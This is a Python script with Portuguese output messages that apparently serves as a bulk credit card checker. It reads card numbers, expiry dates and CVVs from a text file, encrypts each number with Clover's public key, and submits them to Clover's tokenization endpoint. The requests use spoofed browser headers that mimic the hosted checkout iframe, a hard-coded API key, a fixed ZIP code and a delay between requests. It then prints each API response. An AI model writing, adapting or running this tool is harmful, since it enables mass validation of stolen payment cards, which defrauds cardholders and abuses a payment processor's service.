import os
import time
import base64
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA1
from Crypto.Util.number import bytes_to_long

CARDS_FILE = "cards.txt"

class CloverEncrypt:
    def __init__(self, pan, prefix_id="00000000"):
        self.pan = pan
        self.prefix_id = prefix_id
        self.public_key = self._get_public_key()

    def _get_public_key(self):
        response = requests.get("https://checkout.clover.com/assets/keys.json")
        keys = response.json()
        public_key_base64 = keys["TA_PUBLIC_KEY_PROD"]
        key_bytes = base64.b64decode(public_key_base64)

        modulus_bytes = key_bytes[:256]
        exponent_bytes = key_bytes[256:]

        modulus = bytes_to_long(modulus_bytes)
        exponent = bytes_to_long(exponent_bytes)

        return RSA.construct((modulus, exponent))

    def encrypt(self):
        input_data = f"{self.prefix_id}{self.pan}".encode()
        cipher = PKCS1_OAEP.new(self.public_key, hashAlgo=SHA1)
        cipher_text = cipher.encrypt(input_data)
        return base64.b64encode(cipher_text).decode()

    def get_encrypted_pan(self):
        return self.encrypt()

def read_cards_from_file(file_path=CARDS_FILE):
    cards = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                if line:
                    card_number, expiry_month, expiry_year, cvv = line.split('|')
                    cards.append((card_number, expiry_month, expiry_year, cvv))
        return cards
    except FileNotFoundError:
        print(f"Erro: Arquivo {file_path} não encontrado.")
        exit(1)
    except ValueError:
        print("Erro: Formato inválido no arquivo TXT. Use: número|mês|ano|cvv")
        exit(1)

def gerar_token_cartao(pan, exp_month, exp_year, cvv, first6, last4, brand, address_zip):
    clover = CloverEncrypt(pan)
    encrypted_pan = clover.get_encrypted_pan()

    payload = {
        "card": {
            "encrypted_pan": encrypted_pan,
            "exp_month": str(exp_month),
            "exp_year": str(exp_year),
            "cvv": cvv,
            "first6": first6,
            "last4": last4,
            "brand": brand,
            "address_zip": address_zip
        }
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'apikey': 'bc22012281f7c86f7aa9b5c865b718c0',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://checkout.clover.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://checkout.clover.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0',
        'x-clover-client-type': 'HOSTED_IFRAME'
    }

    url = "https://token.clover.com/v1/tokens"
    response = requests.post(url, json=payload, headers=headers)

    try:
        return response.json()
    except Exception:
        return response.text

def test_card(card_number, expiry_month, expiry_year, cvv):
    first6 = card_number[:6]
    last4 = card_number[-4:]
    brand = "VISA"
    address_zip = "21502"

    token_response = gerar_token_cartao(card_number, expiry_month, expiry_year, cvv, first6, last4, brand, address_zip)

    return token_response

if __name__ == "__main__":
    cards = read_cards_from_file()
    for card in cards:
        card_number, expiry_month, expiry_year, cvv = card
        token_response = test_card(card_number, expiry_month, expiry_year, cvv)
        time.sleep(5)
        print("[ℹ️] Resposta da Api da Clover:", token_response)